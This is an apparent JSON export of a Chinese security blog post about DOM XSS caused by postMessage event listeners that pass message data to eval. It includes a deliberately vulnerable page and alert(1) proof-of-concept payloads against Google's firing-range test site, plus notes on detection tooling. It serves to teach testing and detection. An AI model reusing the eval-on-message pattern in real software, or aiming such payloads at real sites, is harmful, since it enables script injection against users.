{"title":"EventListener XSS","uid":"68bdee9933fc5dc89a593d8b4b4eaea6","slug":"EventListener XSS","date":"2022-03-25T10:38:45.000Z","updated":"2023-09-29T03:48:35.085Z","comments":true,"path":"api/articles/EventListener XSS.json","keywords":null,"cover":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20220720/XSS_cover.jpg","content":"<p><strong>EventListener XSS</strong><br>XSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是<code>DOM</code>型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听<code>postMessage</code>所导致漏洞。首先从事件监听器开始说起</p>\n<h2 id=\"事件监听器\"><a href=\"#事件监听器\" class=\"headerlink\" title=\"事件监听器\"></a>事件监听器</h2><p>事件监控器可以为指定对象设置一个回调函数，当该对象的指定事件被触发时会被执行：</p>\n<pre class=\"line-numbers language-HTML\" data-language=\"HTML\"><code class=\"language-HTML\">&lt;table id=\"outside\"&gt;\n    &lt;tr&gt;&lt;td id=\"t1\"&gt;one&lt;/td&gt;&lt;/tr&gt;\n    &lt;tr&gt;&lt;td id=\"t2\"&gt;two&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;\n&lt;script&gt;\nfunction modifyText() {\n  var t2 = document.getElementById(\"t2\");\n  if (t2.firstChild.nodeValue == \"three\") {\n    t2.firstChild.nodeValue = \"two\";\n  } else {\n    t2.firstChild.nodeValue = \"three\";\n  }\n}\n\n// 为table添加事件监听器\nvar el = document.getElementById(\"outside\");\nel.addEventListener(\"click\", modifyText, false);\n&lt;/script&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>以上代码监听了<code>table</code>的<code>click</code>事件，当点击<code>table</code>时会触发<code>modifyText</code>,下面链接列出了所有的事件:</p>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/Events#event_index\">https://developer.mozilla.org/en-US/docs/Web/Events#event_index</a></p>\n<p>这里要说的是<code>postMessage</code>与其对应的事件监听器在不安全配置情况下导致的漏洞，首先看下<code>postMessage</code>的介绍：</p>\n<p>&gt; window.postMessage() 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 <code>Document.domain</code>设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要<strong>正确的使用</strong>，这种方法就很安全。 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage\">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a></p>\n<p>它的用法也很简单：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">windows.postMessage(message, targetOrigin, [transfer])<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li><p>windows是指一个窗口，可以是当前页面的<code>window</code>、<code>window.open</code>返回的窗口对象、<code>iframe</code>的<code>contentWindow</code>属性等</p>\n</li>\n<li><p>message是要发送的消息，可以是字符串，也可以是<code>json</code>格式</p>\n</li>\n<li><p><code>targetOrigin</code>用来指定哪个窗口可以接收到消息，如果为<code>*</code>则表示任意窗口均可收到信息。而如果指定了特定的域名后要求发送消息的窗口其协议、端口、主机地址与指定域名匹配才可发送消息。</p>\n</li>\n</ul>\n<p>发送消息事件可以通过如下方式添加监听事件：</p>\n<pre class=\"line-numbers language-JavaScript\" data-language=\"JavaScript\"><code class=\"language-JavaScript\">window.addEventListener(\"message\", receiveMessage, false);\nfunction receiveMessage(event)\n{\n}<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>当发送信息时就会触发<code>receiveMessage</code>。其中<code>event</code>的属性比较重要的有：</p>\n<ul>\n<li><p>data 即<code>postMessage</code>发送的数据</p>\n</li>\n<li><p>origin 发送信息窗口的<code>origin</code></p>\n</li>\n</ul>\n<h2 id=\"漏洞触发\"><a href=\"#漏洞触发\" class=\"headerlink\" title=\"漏洞触发\"></a>漏洞触发</h2><p>比起原理，大家肯定对漏洞如何利用更感兴趣。看下面这段代码</p>\n<pre class=\"line-numbers language-HTML\" data-language=\"HTML\"><code class=\"language-HTML\">&lt;html&gt;\n  &lt;head&gt;&lt;title&gt;Toxic DOM&lt;/title&gt;&lt;/head&gt;\n  &lt;body&gt;\n    &lt;script&gt;\n      var postMessageHandler = function(msg) {\n  var content = msg.data;\n  var msgObj = eval(content);\n\n  if (msgObj.isActive) {\n    document.write(\"PostMessage arrived!\");\n  }\n}\n\nwindow.addEventListener('message', postMessageHandler, false);\n\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n&lt;!-- https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval --&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>很明显可以看出这个页面在监听到<code>postMessage</code>时会调用<code>eval</code>执行发送的信息，那我们就可以构造<code>payload</code>了</p>\n<pre class=\"line-numbers language-HTML\" data-language=\"HTML\"><code class=\"language-HTML\">&lt;script&gt;\n                    function pocLink() {\n                        let win = window.open('https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval');\n                        let msg = \"alert(1);\";\n\n                        setTimeout(function(){\n                            win.postMessage(msg, '*');\n                        }, 5000);\n                    }\n&lt;/script&gt;\n &lt;a href=\"#\" onclick=\"pocLink();\"&gt;PoC link&lt;/a&gt;         <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>或者是使用<code>iframe</code></p>\n<pre class=\"line-numbers language-HTML\" data-language=\"HTML\"><code class=\"language-HTML\">&lt;script&gt;\n\n  function pocFrame(win) {           \n    let msg = \"alert(1);\";\n\n    win.postMessage(msg, '*');          \n  }\n&lt;/script&gt;\n &lt;iframe src=\"https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval\" onload=\"pocFrame(this.contentWindow)\"&gt;&lt;/iframe&gt;    <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>也就是说我们需要在自己服务器上新建一个页面，用来打开一个新窗口或是加载一个<code>iframe</code>并获取其句柄，用来传递信息。当打开的窗口中存在有<code>message</code>监听，且其触发代码有可利用点时就可以触发漏洞。</p>\n<h2 id=\"工具检测\"><a href=\"#工具检测\" class=\"headerlink\" title=\"工具检测\"></a>工具检测</h2><p>纯手工发现漏洞不可取，<code>Burp</code>的<code>DOM Invader</code>就可以帮助发现此类问题</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image20.1l50zy96mokg.png\" alt=\"img\"></p>\n<p>对于<code>https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval</code> 它可以直接检测出漏洞存在并一键生成<code>POC</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image21.n4byv2n2acw.png\" alt=\"img\"></p>\n<p>为了了解原理最好可以看看它的代码，但是其源码做了混淆，没办法了解它的原理，所以我们从它的平替<a href=\"https://github.com/fransr/postMessage-tracker\">postMessage-tracker</a>入手进行分析。 其检测结果展示形式为</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image22.6qq7cqyazzg0.png\" alt=\"img\"></p>\n<p>平平无奇的一个小框框，相较于<code>DOM Invader</code>的可利用性分析差了许多，不过仅仅了解下原理已然足够了。</p>\n<p>它的目录结构非常简单，首先看下<code>mainfest.json</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image23.1tng48w41gyo.png\" alt=\"img\"></p>\n<p><code>run_at</code>表明注入在<code>css</code>之后，<code>dom</code>构建之前。关键代码在<code>content_script.js</code>当中：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image24.6br43k6e3x00.png\" alt=\"img\"></p>\n<p>这一段的主要作用就是在添加监听器前判断其类型是否时<code>message</code>，如果是则记录下来一些数据，比如此时的堆栈信息等。合理推测<code>Burp</code>在此之上加入了危险函数判断的操作，后续有空的话就给<code>DOM Invader</code>加一个类似的功能练练手吧，日常使用当然还是<code>Burp</code>的香啊~</p>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><ul>\n<li><p><a href=\"https://github.com/fransr/postMessage-tracker\">https://github.com/fransr/postMessage-tracker</a></p>\n</li>\n<li><p><a href=\"https://portswigger.net/burp/documentation/desktop/tools/dom-invader\">https://portswigger.net/burp/documentation/desktop/tools/dom-invader</a></p>\n</li>\n</ul>\n","text":"EventListener XSSXSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是DOM型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听postMessage所导...","link":"","photos":[],"count_time":{"symbolsCount":"3.7k","symbolsTime":"3 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"XSS","slug":"XSS","count":1,"path":"api/tags/XSS.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E5%99%A8\"><span class=\"toc-text\">事件监听器</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91\"><span class=\"toc-text\">漏洞触发</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B7%A5%E5%85%B7%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">工具检测</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">参考文章</span></a></li></ol>","author":{"name":"RainSec","slug":"blog-author","avatar":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"云原生项目Fuzz特点及思考","uid":"5c3101d9d1523d1869d7d8a2235ebd0e","slug":"Go-Fuzz解析与思考","date":"2022-03-25T10:48:45.000Z","updated":"2023-09-29T03:48:35.037Z","comments":true,"path":"api/articles/Go-Fuzz解析与思考.json","keywords":null,"cover":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20220720/gofuzzcover.png","text":"Go-fuzz的解析与思考go-fuzz Go-fuzz的原理很多都是基于AFL，这里只分析了一些它独特的地方，收获很多，也希望可以和大家交流，如有分析错误还望交流指正。 ​ go-fuzz是goog...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"13 mins."},"categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","count":6,"path":"api/categories/漏洞挖掘.json"}],"tags":[{"name":"Fuzz","slug":"Fuzz","count":4,"path":"api/tags/Fuzz.json"}],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"runC-fuzz","uid":"280c433ecf11c03958de8f79adb38b6b","slug":"RunC-Fuzz","date":"2022-03-11T10:48:45.000Z","updated":"2023-09-29T03:48:35.105Z","comments":true,"path":"api/articles/RunC-Fuzz.json","keywords":null,"cover":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20220720/runc.7k7938728c80.webp","text":"runC-fuzz​本文主要是根据AdaLogics开源的runc-fuzzers和自己之前做的一些fuzz，研究一下可能的问题和相关的解决方案。在此之前可能会有朋友对runc比较陌生，可以参考一下之...","link":"","photos":[],"count_time":{"symbolsCount":"4.2k","symbolsTime":"4 mins."},"categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","count":6,"path":"api/categories/漏洞挖掘.json"}],"tags":[{"name":"Fuzz","slug":"Fuzz","count":4,"path":"api/tags/Fuzz.json"}],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://jsd.cdn.zzko.cn/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}